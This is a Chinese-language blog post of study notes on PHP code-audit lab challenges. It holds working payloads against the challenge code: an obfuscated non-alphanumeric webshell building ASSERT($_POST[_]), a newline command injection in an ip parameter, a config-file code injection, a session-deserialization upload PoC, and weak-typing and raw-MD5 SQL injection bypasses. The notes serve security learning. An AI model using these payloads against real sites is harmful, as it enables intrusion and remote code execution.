---
title: 'Code-Audit-Challenges#php 刷题记录【历史笔记】'
date: 2020-09-03 17:58:00
tags: []
published: true
hideInList: false
feature: 
isTop: false
---
> 堆点安全的博文，一直以来是笔记党。把去年8月的刷题笔记发上来。正在做的攻防世界没做啥刷题笔记，就用这篇代替啦（bu 
> 今年光顾着写代码了，安全啥的给落下了还是要继续努力>-<  （而且发现好久不巩固是会忘记的，又要再次巩固学习一次了）



题目列表
- https://github.com/CHYbeta/Code-Audit-Challenges
https://blog.szfszf.top/tech/code-audit-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/
<!-- more -->
## Challenge1 phpBug #69892
解法1：
把提供的users数组内的值全都md5破解，匹配有哪一条能够破解。
其中
`5:06e2b745f3124f7d670f78eabaa94809"`
破解为
![](https://1dayluo.github.io/post-images/1599127439523.png)
根据代码
````php
$input = $_COOKIE['user'];
$input[1] = md5($input[1]);
foreach ($users as $user){        
$user = explode(":", $user);        
if ($input === $user) {                
$uid = $input[0] + 0;                
$valid_user = true;        
}}
````
user[1]为密码
user[0]为uid
![](https://1dayluo.github.io/post-images/1599127536773.png)
如图即可成功登录为授权用户。
解法2：（出题人希望）
在5.4以下的版本会有

在代码的实现中，比较后赋值的变量是int型32位，但是等号右边是两个64位相减。等号右边低32位相减为0则会误判为相等。
（貌似大意是这个）
The problem in the code above is that numerical indices got compared by subtracting their values from each other, which are stored in the h element of the bucket data type. A difference is then detected if the result is 0 or not. Unfortunately the h element of the structure bucket is defined as unsigned long, which is usually 64bit on 64bit systems, but the result variable is only a 32bit int data type. Therefore the comparison is not only true if the values of h are identical but every time the result of the subtraction has all zero lower 32 bits. Therefore the key 0 and the key 4294967296 and many other keys are considered identical.

具体讲解看源代码和官方题解。
所以会产生一个安全bug，例如以下例子
`var_dump([0 => 0] === [0x100000000 => 0]); // bool(true)`
user[4294967296]=5即[0x100000000 => 5] == [0 =>5]

比较的时候
````php
if ($input === $user) {
           $uid = $input[0] + 0;                
           $valid_user = true;       
 }
````
这里用户名用这里会比较通过（以用户5的身份进行比较）。
但是在下一行代码，取$input[0]的时候，会发现user[0]不存在。于是$uid便为：
`$uid=NULL+0;//uid=0;`
最终将以用户0的身份登录，也就是admin用户。
最终payload为
`Cookie: user[4294967296]=5;user[1]=hund;`

## Challenge2 php弱类型,is_numeric()
源代码：
````php
<?php
show_source(__FILE__);
$flag = "xxxx";
if(isset($_GET['time'])){  
        if(!is_numeric($_GET['time'])){  
                echo 'The time must be number.';  
        }else if($_GET['time'] < 60 * 60 * 24 * 30 * 2){  
                        echo 'This time is too short.';  
        }else if($_GET['time'] > 60 * 60 * 24 * 30 * 3){  
                        echo 'This time is too long.';  
        }else{  
                sleep((int)$_GET['time']);  
                echo $flag;  
        }  
                echo '<hr>';  
}
?>
````
payload

`time=5.184001e6
//或0x4F1A01`

判断时time等于5184000，科学计数法传参到sleep失效。

## Challenge3 php配置文件写入问题
源代码：
![](https://1dayluo.github.io/post-images/1599127684662.png)

payload

`option=222%27;%0aphpinfo();\\`


xxxxx/option.php内容会变为：
![](https://1dayluo.github.io/post-images/1599127711676.png)

## Challenge5 webshell、waf绕过
利用的是当字符串与数组拼接后为一个字符串，值为Array。测试如下（php5下5.4及以上的能用。5.2,5.3，php7都没这个特性）
![](https://1dayluo.github.io/post-images/1599127747253.png)
payload（ https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/ ）
*刚开始学习阶段，打算先从学习别人如何写开始
````php
<?php
$_='';$_[+$_]++;
$_=$_.'';    //获取字符串：“Array”。
$__=$_[+'']; //获取大写字母A $__为"A"
$_ = $__; //$_为A 
$___=$_; //$__为A
$__=$_; //$__为A 
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__此时为S
$___.=$__;//$___为AS
$___.=$__; //$__为ASS
$__=$_;//$__为A
$__++;$__++;$__++;$__++;//$__为E
$___.=$__;
$__=$_; //$__初始化为A
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__此时为R
$___.=$__; //$___此时为ASSER
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//$__此时为T
$___.=$__; //$___此时为ASSERT
$____='_';//$___此时值为_
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$_此时为P
$____.=$__; //_P ？？？
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__; //_PO
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__; //_POS
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__;//_POST
$_=$$____;//$_的值为$POST;
$___($_[_]);  //最终$___为ASSERT，$_为$_POST组合起来就是ASSERT($_POST[_])
//最后burpsuite抓包赋值给_
````
最终payload
````php
http://192.168.1.134/Challenge5.php?c=$_=%27%27;$_[%2b$_]%2b%2b;$_=$_.%27%27;$__=$_[%2b%27%27];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=%27_%27;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);
````
web页面:
![](https://1dayluo.github.io/post-images/1599127806565.png)
我在webshell的url下传参给_，没有生效。不知道为什么.
![](https://1dayluo.github.io/post-images/1599127826511.png)
## Challenge6 #命令执行，waf绕过

（Linux环境运行php）payload:

`http://192.168.1.134/Challenge6.php?ip=127.0.0.1%0als`

## Challenge7 php弱类型
php中==会把0e开头的字符串当作科学计数法的形式用（admin674227342的md5值也是0e开头）。只需输入一个32位0e开头的值即可
这道题的题解并没在本地环境中生效。php版本从5.2/5.3/5.4/5.5/5.6到php7都没有触发，很想知道是为什么

## Challenge8 SQL注入#tricks
关键在下句

`mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();`
desc没有用反引号与内置关键字区分开
![](https://1dayluo.github.io/post-images/1599127903177.png)

## Challenge9
````php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
   public $mdzz;
   function __construct()
   {
           $this->mdzz = 'phpinfo();';
   }
   function __destruct()
   {
           eval($this->mdzz);
   }
}
if(isset($_GET['phpinfo']))
{
   $m = new OowoO();
}
else
{
   highlight_string(file_get_contents('index.php'));
}
?>
````
可以推测出，关键在于利用eval($this->mdzz);这个函数。但是接下来就迷茫了。
查了一下网上的:


从魔法函数可以看出这是一个反序列化漏洞，


感觉自己该补充一下反序列化漏洞的知识了，学习了https://godlin.top/2018/11/08/web-2/ 和 https://zhuanlan.zhihu.com/p/60397730 以后知道能够利用的代码在：
`ini_set('session.serialize_handler', 'php');`
在ini配置文件中，'serialize_handler' => 'php_serialize'
在设置和读取session两个阶段中，如果使用了不同序列化方法将产生任意对象注入从而导致反序列化漏洞。这道题按照网上payload没有复现成功。于是我又阅读了一篇关于序列化的文章： https://www.anquanke.com/post/id/159206
用到的知识点有以下
1.序列化漏洞常见的魔法函数（水题多出现）
2.session反序列化漏洞
即存储时使用php_serialize（输入了含|的内容，其中|后包括要执行的php代码），序列化的内容会存储到/tmp文件夹下
读取时使用php，将|后的内容当作value。从而将该内容赋值给变量
3.session.upload_progress.enabled为On时，php处理机制（如下）
session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。
![](https://1dayluo.github.io/post-images/1599127960012.png)
+*php大于5.5.4的版本中默认使用php_serialize规则

故可知应如下构造payload：
构造一个上传表单的poc。表单中PHP_SESSION_UPLOAD_PROGRESS中的value设为php_serialize序列化的字符串：

`|O:5:"OowoO":1:{s:4:"mdzz";s:26:"print_r(scandir(__dir__));";}`

最终如下
````html
<form action="http://192.168.1.134/Challenge9.php" method="POST" enctype="multipart/form-data"> <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="|O:5:"OowoO":1:{s:4:"mdzz";s:26:"print_r(scandir(__dir__));";}" /> <input type="file" name="file" /> <input type="submit" /> </form>
````
原题是通过序列化漏洞读取文件目录，然后再利用该poc读取flag文件内容。

右边是我注入的，左边是网友成功的。但是谜之一到我的环境就失败
![](https://1dayluo.github.io/post-images/1599128004791.png)
## Challenge10 #php弱类型绕过
题目在线网址 http://web.jarvisoj.com:32780/index.php?id=1
````php
<?php
error_reporting(0);
echo "<!--index.phps-->";
if(!$_GET['id'])
{
        header('Location: index.php?id=1');
        exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))//如果a变量有.出现
{
        echo 'Hahahahahaha';
        return ;
}
$data = @file_get_contents($a,'r'); //读取a变量所代表的文件
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
        require("flag.txt");
}
else
{
        print "work harder!harder!harder!";
}
?>
````
要绕过的代码
````php
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
````
要学习的文章： 
php弱类型：
https://www.secpulse.com/archives/69529.html（已完成）
php://input
https://www.waitalone.cn/php-file-include.html

学习后发现就是利用php://input把文件包含漏洞变为命令执行漏洞。
b则为%00截断。
但是00截断触发是有条件的： https://skysec.top/2017/09/06/%E8%BF%87%E6%B0%94%E7%9A%8400%E6%88%AA%E6%96%AD/
php版本小于5.3.4才可以

![](https://1dayluo.github.io/post-images/1599128065576.png)

## Challenge11


要注入下列sql语句：
`"select * from `admin` where password='".md5($pass,true)."'"`

关键在md5($pass,true)，若$pass的值为ffifdyop，则经过md5转换后的值再经过php转为字符串后会变成'or'6蒥欓!r,b，6的后面是一堆乱七八糟的字符，姑且记为xx吧。则最后的sql查询语句为：

`select * from `admin` where password=''or'6蒥欓!r,b'`

